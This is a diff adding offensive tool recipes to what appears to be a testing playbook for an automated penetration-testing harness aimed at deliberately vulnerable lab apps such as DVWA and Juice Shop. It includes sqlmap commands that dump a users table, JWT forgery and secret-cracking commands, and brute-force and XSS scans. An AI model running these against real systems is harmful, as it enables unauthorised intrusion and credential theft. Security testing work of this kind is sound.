@@ -67,6 +67,34 @@ ${7*7}           (EL/template variants)
 Confirm = marker reflected unencoded in response body, or template math
 evaluated. Console.log markers avoid side effects vs alert().
 
+## Tool-backed recipes (prebaked image; embed SENTINEL_GRANT)
+
+Prefer these over hand-rolled payloads once a vuln class is suspected — they
+produce reproducible artifacts that clear the 5-check gate faster.
+
+```bash
+# SQLi (DVWA/Juice Shop/VAmPI/DSVW) — dump proof, not just detect
+sqlmap -u "<url>?id=1" --batch --level=2 --risk=2 --dbs --output-dir=artifacts/sqlmap
+sqlmap -u "<url>" --data="username=a&password=b" --batch --dump -T users --output-dir=artifacts/sqlmap
+
+# JWT — RS256->HS256 confusion (Juice Shop admin forgery), none-alg, weak-secret
+jwt_tool <token> -X k -pk artifacts/pubkey.pem      # key confusion
+jwt_tool <token> -X a                               # alg:none
+jwt_tool <token> -C -d /usr/share/wordlists/*.txt   # crack weak HMAC secret
+
+# Params / hidden endpoints / dir brute
+arjun -u "<url>" -oJ artifacts/arjun.json           # discover hidden params
+ffuf -u "<url>/FUZZ" -w <wordlist> -o artifacts/ffuf.json
+gobuster dir -u "<url>" -w <wordlist> -o artifacts/gobuster.txt
+
+# XSS at scale (reflected/DOM sink discovery)
+dalfox url "<url>?q=FUZZ" -o artifacts/dalfox.txt
+
+# Template scan + TLS
+nuclei -u "<url>" -severity low,medium,high,critical -rl 20 -o artifacts/nuclei.txt
+testssl.sh --quiet --jsonfile artifacts/testssl.json "<host>:443"
+```
+
 ## Usage rules
 
 - One payload class per probe batch; log every request to artifacts.
